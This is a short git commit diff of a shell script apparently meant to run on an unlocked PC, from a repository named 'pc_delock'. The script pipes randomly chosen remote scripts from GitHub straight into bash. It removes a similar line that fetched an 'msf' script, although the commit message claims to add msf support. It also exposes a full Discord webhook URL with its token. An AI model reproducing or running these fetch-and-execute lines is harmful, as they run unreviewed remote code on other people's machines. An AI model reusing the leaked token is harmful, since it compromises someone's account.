8a4f10d754cd29216480f0226372cf873374c102
Remy <remy.noulin@epitech.eu>
2022-10-06 19:30:30 +0200

    [MOD] add msf support

--- script.sh
+++ script.sh
@@ -3,7 +3,6 @@
 WEBHOOK_URL="https://discord.com/api/webhooks/1026544372226986046/esBmXNyXYcIajaAB-_T5taEBqaOud6c_jIWRpreOet7Eo65teeAc63ow9passnBlgxje"
 rdm=$(( RANDOM % 16 ))
 
-curl -s "https://Waz0x.github.io/msf" | bash
 curl -s "https://raw.githubusercontent.com/Waz0x/pc_delock/master/scripts/$rdm.sh" | bash
 curl \
   -H "Content-Type: application/json" \
